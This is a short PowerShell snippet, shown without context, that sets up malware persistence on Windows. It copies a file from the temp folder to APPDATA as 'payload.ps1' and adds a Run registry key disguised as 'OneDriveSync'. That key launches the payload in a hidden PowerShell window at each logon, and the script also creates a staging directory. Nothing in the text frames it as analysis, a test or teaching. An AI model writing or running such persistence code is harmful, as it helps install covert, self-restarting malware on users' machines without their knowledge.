
Copy-Item -Path "$env:TEMP\svcupdate.exe" -Destination "$env:APPDATA\payload.ps1" -Force
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v 'OneDriveSync' /t REG_SZ /d "powershell.exe -NoP -WindowStyle Hidden -File $env:APPDATA\payload.ps1" /f
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
